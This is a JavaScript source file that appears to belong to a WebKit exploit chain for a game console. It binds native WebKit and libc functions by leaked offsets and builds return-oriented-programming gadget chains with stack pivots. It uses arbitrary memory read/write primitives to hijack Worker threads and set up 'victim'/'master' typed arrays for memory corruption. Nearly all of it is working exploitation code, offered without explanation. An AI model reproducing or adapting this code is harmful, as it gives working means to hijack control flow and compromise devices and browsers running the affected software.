//#region Constants
fn.JSGlobalContextCreate = new NativeFunction(webkit_base.add(constants.wk_JSGlobalContextCreate), "bint");
fn.JSGlobalContextRelease = new NativeFunction(webkit_base.add(constants.wk_JSGlobalContextRelease));
fn.JSContextGetGlobalObject = new NativeFunction(webkit_base.add(constants.wk_JSContextGetGlobalObject), "bint");
fn.JSObjectGetProperty = new NativeFunction(webkit_base.add(constants.wk_JSObjectGetProperty), "bint");
fn.JSObjectSetProperty = new NativeFunction(webkit_base.add(constants.wk_JSObjectSetProperty));
fn.JSStringCreateWithUTF8CString = new NativeFunction(webkit_base.add(constants.wk_JSStringCreateWithUTF8CString), "bint");
fn.JSEvaluateScript = new NativeFunction(webkit_base.add(constants.wk_JSEvaluateScript), "bint");
fn.JSValueToStringCopy = new NativeFunction(webkit_base.add(constants.wk_JSValueToStringCopy), "bint");
fn.JSStringGetMaximumUTF8CStringSize = new NativeFunction(webkit_base.add(constants.wk_JSStringGetMaximumUTF8CStringSize), "number");
fn.JSObjectMakeTypedArrayWithBytesNoCopy = new NativeFunction(webkit_base.add(constants.wk_JSObjectMakeTypedArrayWithBytesNoCopy), "bint");
fn.JSStringGetUTF8CString = new NativeFunction(webkit_base.add(constants.wk_JSStringGetUTF8CString), "number");
fn.JSStringRelease = new NativeFunction(webkit_base.add(constants.wk_JSStringRelease));
fn.JSValueMakeString = new NativeFunction(webkit_base.add(constants.wk_JSValueMakeString), "bint");

// used for threading
fn.pthread_attr_destroy = new NativeFunction(webkit_base.add(constants.wk_pthread_attr_destroy), "number");
fn.pthread_attr_get_np = new NativeFunction(webkit_base.add(constants.wk_pthread_attr_get_np), "number");
fn.pthread_attr_getstack = new NativeFunction(webkit_base.add(constants.wk_pthread_attr_getstack), "number");
fn.pthread_attr_init = new NativeFunction(webkit_base.add(constants.wk_pthread_attr_init), "number");
fn.pthread_self = new NativeFunction(webkit_base.add(constants.wk_pthread_self), "bint");
fn.pthread_attr_setstacksize = new NativeFunction(webkit_base.add(constants.wk_pthread_attr_setstacksize), "number");
fn.pthread_cond_broadcast = new NativeFunction(webkit_base.add(constants.wk_pthread_cond_broadcast), "number");
fn.pthread_cond_destroy = new NativeFunction(webkit_base.add(constants.wk_pthread_cond_destroy), "number");
fn.scePthreadCondInit = new NativeFunction(libc_base.add(constants.c_scePthreadCondInit), "number");
fn.pthread_cond_signal = new NativeFunction(webkit_base.add(constants.wk_pthread_cond_signal), "number");
fn.pthread_cond_wait = new NativeFunction(webkit_base.add(constants.wk_pthread_cond_wait), "number");
fn.pthread_create = new NativeFunction(webkit_base.add(constants.wk_pthread_create), "number");
fn.pthread_detach = new NativeFunction(webkit_base.add(constants.wk_pthread_detach), "number");
fn.pthread_join = new NativeFunction(webkit_base.add(constants.wk_pthread_join), "number");
fn.pthread_mutex_destroy = new NativeFunction(webkit_base.add(constants.wk_pthread_mutex_destroy), "number");
fn.pthread_mutex_init = new NativeFunction(webkit_base.add(constants.wk_pthread_mutex_init), "number");
fn.pthread_mutex_lock = new NativeFunction(webkit_base.add(constants.wk_pthread_mutex_lock), "number");
fn.pthread_mutex_unlock = new NativeFunction(webkit_base.add(constants.wk_pthread_mutex_unlock), "number");

// used for allocs
fn.snprintf = new NativeFunction(libc_base.add(constants.c_snprintf), "bint");
fn.longjmp = new NativeFunction(libc_base.add(constants.c_longjmp), "number");
fn.setjmp = new NativeFunction(libc_base.add(constants.c_setjmp), "number");
fn.malloc = new NativeFunction(webkit_base.add(constants.wk_malloc), "bint");
fn.free = new NativeFunction(webkit_base.add(constants.wk_free));

fn.sched_yield = new NativeFunction(0x14b, "number");
//#endregion
//#region Classes
class Thread {
  constructor(stack_size, name) {
    if (stack_size < 0x4000) {
      throw new Error("Invalid stack size, minimal thread stack size is 0x4000");
    }

    this.name = name;
    this.running = false;
    this.stack_size = stack_size;
    this.mutex_addr = mem.alloc(8);
    this.cond_addr = mem.alloc(8);
    this.attr_addr = mem.alloc(8);
    this.pivot_frame = new Frame(["jmp_rax", "rsp"]);
    this.pivot_stack = new Stack(0x1000);
    this.pivot_pivot = new Pivot();

    this.pivot_insts = [];
    this.pivot_insts.push(gadgets.POP_RAX_RET);
    this.pivot_insts.push("jmp_rax");
    this.pivot_insts.push(gadgets.PUSH_RBP_JMP_QWORD_PTR_RAX);

    this.pivot_frame.store(this.pivot_insts, "rsp");

    fn.pthread_mutex_lock.chain(this.pivot_insts, this.mutex_addr);
    fn.pthread_cond_wait.chain(this.pivot_insts, this.cond_addr, this.mutex_addr);
    fn.pthread_mutex_unlock.chain(this.pivot_insts, this.mutex_addr);

    this.pivot_frame.load(this.pivot_insts, "rsp");
    this.pivot_insts.push(gadgets.PUSH_RAX_POP_RBP_RET);
    this.pivot_insts.push(gadgets.POP_RAX_RET);
    this.pivot_insts.push(0);
    this.pivot_insts.push(gadgets.LEAVE_RET);
  }

  free() {
    mem.free(this.mutex_addr);
    mem.free(this.cond_addr);
    mem.free(this.attr_addr);
  }

  resume() {
    if (fn.pthread_mutex_lock.invoke(this.mutex_addr)) {
      throw new Error(`Unable to lock mutex ${this.mutex_addr} !!`);
    }

    if (fn.pthread_cond_signal.invoke(this.cond_addr)) {
      throw new Error(`Unable to signal cond ${this.ctx.cond} !!`);
    }

    if (fn.pthread_mutex_unlock.invoke(this.mutex_addr)) {
      throw new Error(`Unable to unlock mutex ${this.mutex_addr} !!`);
    }
  }

  join() {
    logger.debug(`Wait for thread ${this.name} to join...`);

    if (fn.pthread_join.invoke(this.pthread_addr, 0)) {
      throw new Error(`Unable to join thread ${this.name} !!`);
    }

    logger.debug(`Thread ${this.name} returned !!`);

    this.running = false;

    this.pivot_frame.reset();
    this.pivot_stack.reset();

    if (fn.pthread_mutex_destroy.invoke(this.mutex_addr)) {
      throw new Error(`Unable to destroy mutex ${this.mutex_addr} !!`);
    }

    if (fn.pthread_cond_destroy.invoke(this.cond_addr)) {
      throw new Error(`Unable to destroy cond ${this.cond_addr} !!`);
    }

    if (fn.pthread_attr_destroy.invoke(this.attr_addr)) {
      throw new Error(`Unable to destroy attr ${this.attr_addr} !!`);
    }
  }

  inject(stack) {
    const pthread_sp = this.pthread_stack_addr.add(this.pthread_stack_size.sub(0x40));
    const copy_size = stack.view.byteLength - stack.offset;
    let new_sp = pthread_sp.sub(copy_size);

    const target_sp = stack.sp;
    mem.copy(new_sp, target_sp, copy_size);

    this.pivot_frame.set_value("rsp", new_sp);
  }

  spawn() {
    if (this.running) {
      logger.info(`Thread ${this.name} already running !!`);
      return;
    }

    if (fn.pthread_mutex_init.invoke(this.mutex_addr, 0)) {
      throw new Error("Unable to create mutex !!");
    }

    if (fn.scePthreadCondInit.invoke(this.cond_addr, 0)) {
      throw new Error("Unable to create cond !!");
    }

    if (fn.pthread_attr_init.invoke(this.attr_addr)) {
      throw new Error("Unable to create attr !!");
    }

    if (fn.pthread_attr_setstacksize.invoke(this.attr_addr, this.stack_size)) {
      throw new Error("Unable to set stack size !!");
    }

    this.pivot_frame.set_value("jmp_rax", gadgets.POP_RAX_RET);

    this.pivot_stack.prepare(this.pivot_insts, this.pivot_frame);
    this.pivot_pivot.prepare(this.pivot_stack.sp);

    const pthread_addr_addr = mem.alloc(8);

    const pivot_store_addr = mem.alloc(8);

    const pivot_addr = this.pivot_pivot.addr;
    arw.view(pivot_store_addr).setBInt(0, pivot_addr, true);

    if (fn.pthread_create.invoke(pthread_addr_addr, this.attr_addr, gadgets.MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX, pivot_store_addr)) {
      throw new Error(`Unable to create thread ${this.name} !!`);
    }

    if (fn.sched_yield.invoke() === -1) {
      throw new SyscallError("Unable to yield scheduler !!");
    }

    this.pthread_addr = arw.view(pthread_addr_addr).getBInt(0, true);
    this.pthread_id = arw.view(this.pthread_addr).getBInt(0, true);

    mem.free(pthread_addr_addr);
    mem.free(pivot_store_addr);

    const stack_addr_addr = mem.alloc(8);
    const stack_size_addr = mem.alloc(8);

    if (fn.pthread_attr_get_np.invoke(this.pthread_addr, this.attr_addr)) {
      throw new Error(`Unable to get attr from thread ${this.pthread_id} !!`);
    }

    if (fn.pthread_attr_getstack.invoke(this.attr_addr, stack_addr_addr, stack_size_addr)) {
      throw new Error(`Unable to get stack from thread ${this.pthread_id} !!`);
    }

    this.pthread_stack_addr = arw.view(stack_addr_addr).getBInt(0, true);
    this.pthread_stack_size = arw.view(stack_size_addr).getBInt(0, true);

    mem.free(stack_addr_addr);
    mem.free(stack_size_addr);

    this.running = true;
  }
}

class JSThread extends Thread {
  constructor(name, script) {
    super(0x80000, name);

    this.script = script;
    this.js_frame = new Frame(["script_cstr", "ctx", "script", "exception", "ret", "exception_str", "ret_str", "exception_str_size", "ret_str_size", "exception_cstr", "ret_cstr"]);
    this.js_stack = new Stack(0x1000);

    this.js_insts = [];
    this.js_insts.push(0);
    fn.JSGlobalContextCreate.chain(this.js_insts, 0);
    this.js_frame.store(this.js_insts, "ctx");

    this.js_frame.pop(this.js_insts, gadgets.POP_RDI_RET, "script_cstr");
    fn.JSStringCreateWithUTF8CString.chain(this.js_insts);
    this.js_frame.store(this.js_insts, "script");

    this.js_insts.push(gadgets.POP_R9_RET);
    this.js_insts.push("exception");
    this.js_insts.push(gadgets.POP_R8_RET);
    this.js_insts.push(0);
    this.js_insts.push(gadgets.POP_RCX_RET);
    this.js_insts.push(0);
    this.js_insts.push(gadgets.POP_RDX_RET);
    this.js_insts.push(0);
    this.js_frame.pop(this.js_insts, gadgets.POP_RSI_RET, "script");
    this.js_frame.pop(this.js_insts, gadgets.POP_RDI_RET, "ctx");
    fn.JSEvaluateScript.chain(this.js_insts);
    this.js_frame.store(this.js_insts, "ret");

    this.js_frame.pop(this.js_insts, gadgets.POP_RDI_RET, "script");
    fn.JSStringRelease.chain(this.js_insts);

    // return and exception strings
    for (const name of ["exception", "ret"]) {
      this.js_insts.push(gadgets.POP_RDX_RET);
      this.js_insts.push(0);
      this.js_frame.pop(this.js_insts, gadgets.POP_RSI_RET, name);
      this.js_frame.pop(this.js_insts, gadgets.POP_RDI_RET, "ctx");
      fn.JSValueToStringCopy.chain(this.js_insts);
      this.js_frame.store(this.js_insts, `${name}_str`);

      this.js_frame.pop(this.js_insts, gadgets.POP_RDI_RET, `${name}_str`);
      fn.JSStringGetMaximumUTF8CStringSize.chain(this.js_insts);
      this.js_frame.store(this.js_insts, `${name}_str_size`);

      this.js_frame.pop(this.js_insts, gadgets.POP_RDI_RET, `${name}_str_size`);
      fn.malloc.chain(this.js_insts);
      this.js_frame.store(this.js_insts, `${name}_cstr`);

      this.js_frame.pop(this.js_insts, gadgets.POP_RDX_RET, `${name}_str_size`);
      this.js_frame.pop(this.js_insts, gadgets.POP_RSI_RET, `${name}_cstr`);
      this.js_frame.pop(this.js_insts, gadgets.POP_RDI_RET, `${name}_str`);
      fn.JSStringGetUTF8CString.chain(this.js_insts);

      this.js_frame.pop(this.js_insts, gadgets.POP_RDI_RET, `${name}_str`);
      fn.JSStringRelease.chain(this.js_insts);
    }

    this.js_frame.pop(this.js_insts, gadgets.POP_RDI_RET, "ctx");
    fn.JSGlobalContextRelease.chain(this.js_insts);

    this.js_insts.push(gadgets.POP_RBP_RET);
  }

  execute() {
    super.spawn();

    this.js_frame.set_value("script_cstr", this.script.cstr());
    this.js_stack.prepare(this.js_insts, this.js_frame);

    super.inject(this.js_stack);

    super.resume();

    nsleep(1e8);
  }

  join() {
    super.join();

    const exception_cstr = this.js_frame.get_value("exception_cstr");
    const ret_cstr = this.js_frame.get_value("ret_cstr");

    this.exception = String.from(exception_cstr);
    this.ret = String.from(ret_cstr);

    logger.debug(`exception: ${this.exception}`);
    logger.debug(`return: ${this.ret}`);

    fn.free.invoke(exception_cstr);
    fn.free.invoke(ret_cstr);

    this.js_frame.reset();
    this.js_stack.reset();
  }
}
class RPCWorker extends Worker {
  constructor(name) {
    super("src/worker.js");

    this.name = name;
    this.transfer = [];
  }

  execute(name, ...args) {
    return new Promise((resolve, reject) => {
      const onmessage = (e) => {
        const { type, value } = e.data || {};

        if (type === "log") {
          logger.log(value);
          return;
        }

        this.removeEventListener("message", onmessage);

        switch (type) {
          case "ret":
            resolve(value);
            break;
          case "err":
            reject(value);
            break;
        }
      };

      const onerror = (e) => {
        logger.error(`${e.message} (${e.filename}:${e.lineno}:${e.colno})`);
        this.removeEventListener("message", onmessage);
        reject(e);
      };

      this.addEventListener("message", onmessage);
      this.addEventListener("error", onerror, { once: true });

      this.postMessage({ name, args }, this.transfer);
    });
  }

  async rop(insts, frame) {
    const pthread_stack_addr = arw.view(this.pthread_addr).getBInt(0xa8, true);
    logger.debug(`pthread_stack_addr: ${pthread_stack_addr}`);

    const pthread_stack_size = arw.view(this.pthread_addr).getBInt(0xb0, true);
    logger.debug(`pthread_stack_size: ${pthread_stack_size}`);

    const pivot_stack_addr = pthread_stack_addr.add(pthread_stack_size.sub(0x4d8));
    logger.debug(`pivot_stack_addr: ${pivot_stack_addr}`);

    const old_return_addr = arw.view(pivot_stack_addr).getBInt(0, true);
    logger.debug(`old_return_addr: ${old_return_addr}`);

    const old_local_addr = arw.view(pivot_stack_addr).getBInt(8, true);
    logger.debug(`old_local_addr: ${old_local_addr}`);

    const pivot_insts = [];
    const pivot_stack = new Stack(0x1000);

    const jmp_context = mem.alloc(0x48);

    fn.setjmp.chain(pivot_insts, jmp_context);

    for (const inst of insts) {
      pivot_insts.push(inst);
    }

    pivot_insts.push(gadgets.POP_RAX_RET);
    pivot_insts.push(old_return_addr);
    pivot_insts.push(gadgets.POP_RDI_RET);
    pivot_insts.push(jmp_context);
    pivot_insts.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);

    pivot_insts.push(gadgets.POP_RAX_RET);
    pivot_insts.push(pivot_stack_addr);
    pivot_insts.push(gadgets.POP_RDI_RET);
    pivot_insts.push(jmp_context.add(0x10));
    pivot_insts.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);

    pivot_insts.push(gadgets.POP_RAX_RET);
    pivot_insts.push(old_local_addr);
    pivot_insts.push(gadgets.POP_RDI_RET);
    pivot_insts.push(pivot_stack_addr.add(8));
    pivot_insts.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);

    fn.longjmp.chain(pivot_insts, jmp_context);

    pivot_stack.prepare(pivot_insts, frame);

    const stack_sp = pivot_stack.sp;

    arw.view(pivot_stack_addr).setBInt(0, gadgets.POP_RSP_RET, true);
    arw.view(pivot_stack_addr).setBInt(8, stack_sp, true);

    await this.execute("ping");

    mem.free(jmp_context);
  }

  async init() {
    logger.debug(`initializing ${this.name}...`);

    await this.execute("ping");

    const js_worker_addr = arw.addrof(this);
    logger.debug(`js_worker_addr: ${js_worker_addr}`);

    const worker_addr = arw.view(js_worker_addr).getBInt(0x18, true);
    logger.debug(`worker_addr: ${worker_addr}`);

    const m_contextProxy = arw.view(worker_addr).getBInt(0x90, true);
    logger.debug(`m_contextProxy: ${m_contextProxy}`);

    const m_workerThread = arw.view(m_contextProxy).getBInt(0x48, true);
    logger.debug(`m_workerThread: ${m_workerThread}`);

    const m_workerGlobalScope = arw.view(m_workerThread).getBInt(0x88, true);
    logger.debug(`m_workerGlobalScope: ${m_workerGlobalScope}`);

    const m_script = arw.view(m_workerGlobalScope).getBInt(0x140, true);
    logger.debug(`m_script: ${m_script}`);

    const m_workerGlobalScopeWrapper = arw.view(m_script).getBInt(0x10, true);
    logger.debug(`m_workerGlobalScopeWrapper: ${m_workerGlobalScopeWrapper}`);

    this.js_global_context = arw.view(m_workerGlobalScopeWrapper).getBInt(0, true);
    logger.debug(`js_global_context: ${this.js_global_context}`);

    const m_thread = arw.view(m_workerThread).getBInt(0x10, true);
    logger.debug(`m_thread: ${m_thread}`);

    this.pthread_addr = arw.view(m_thread).getBInt(0x28, true);
    logger.debug(`pthread_addr: ${this.pthread_addr}`);

    await this.execute("init", this.name);

    const insts = [];
    const frame = new Frame(["global", "leak_str", "leak_addr_str", "victim_str", "master_str", "leak", "addr_str", "leak_addr", "victim", "master"]);

    const str_buf = mem.alloc(0x20);

    fn.JSContextGetGlobalObject.chain(insts, this.js_global_context);
    frame.store(insts, "global");

    fn.JSStringCreateWithUTF8CString.chain(insts, "leak");
    frame.store(insts, "leak_str");

    fn.JSStringCreateWithUTF8CString.chain(insts, "leak_addr");
    frame.store(insts, "leak_addr_str");

    fn.JSStringCreateWithUTF8CString.chain(insts, "victim");
    frame.store(insts, "victim_str");

    fn.JSStringCreateWithUTF8CString.chain(insts, "master");
    frame.store(insts, "master_str");

    insts.push(gadgets.POP_RCX_RET);
    insts.push(0);
    frame.pop(insts, gadgets.POP_RDX_RET, "leak_str");
    frame.pop(insts, gadgets.POP_RSI_RET, "global");
    fn.JSObjectGetProperty.chain(insts, this.js_global_context);
    frame.store(insts, "leak");

    frame.pop(insts, gadgets.POP_RCX_RET, "leak");
    fn.snprintf.chain(insts, str_buf, 0x20, "%p");
    fn.JSStringCreateWithUTF8CString.chain(insts, str_buf);
    frame.store(insts, "addr_str");

    frame.pop(insts, gadgets.POP_RSI_RET, "addr_str");
    fn.JSValueMakeString.chain(insts, this.js_global_context);
    frame.store(insts, "leak_addr");

    insts.push(gadgets.POP_R9_RET);
    insts.push(0);
    insts.push(gadgets.POP_R8_RET);
    insts.push(0);
    frame.pop(insts, gadgets.POP_RCX_RET, "leak_addr");
    frame.pop(insts, gadgets.POP_RDX_RET, "leak_addr_str");
    frame.pop(insts, gadgets.POP_RSI_RET, "global");
    fn.JSObjectSetProperty.chain(insts, this.js_global_context);

    insts.push(gadgets.POP_RCX_RET);
    insts.push(0);
    frame.pop(insts, gadgets.POP_RDX_RET, "victim_str");
    frame.pop(insts, gadgets.POP_RSI_RET, "global");
    fn.JSObjectGetProperty.chain(insts, this.js_global_context);
    frame.store(insts, "victim");

    insts.push(gadgets.POP_R9_RET);
    insts.push(0);
    insts.push(gadgets.POP_R8_RET);
    insts.push(0);
    insts.push(gadgets.POP_RCX_RET);
    insts.push(0x100);
    frame.pop(insts, gadgets.POP_RDX_RET, "victim");
    fn.JSObjectMakeTypedArrayWithBytesNoCopy.chain(insts, this.js_global_context, 6);
    frame.store(insts, "master");

    insts.push(gadgets.POP_R9_RET);
    insts.push(0);
    insts.push(gadgets.POP_R8_RET);
    insts.push(0);
    frame.pop(insts, gadgets.POP_RCX_RET, "master");
    frame.pop(insts, gadgets.POP_RDX_RET, "master_str");
    frame.pop(insts, gadgets.POP_RSI_RET, "global");
    fn.JSObjectSetProperty.chain(insts, this.js_global_context);

    fn.JSStringRelease.chain(insts, frame.addrof("leak_str"));
    fn.JSStringRelease.chain(insts, frame.addrof("leak_addr_str"));
    fn.JSStringRelease.chain(insts, frame.addrof("addr_str"));
    fn.JSStringRelease.chain(insts, frame.addrof("victim_str"));
    fn.JSStringRelease.chain(insts, frame.addrof("master_str"));

    insts.push(gadgets.POP_RAX_RET);
    insts.push(0);

    await this.rop(insts, frame);

    mem.free(str_buf);

    logger.debug(`${this.name} initialized !!`);
  }
}
//#endregion
//#region Functions
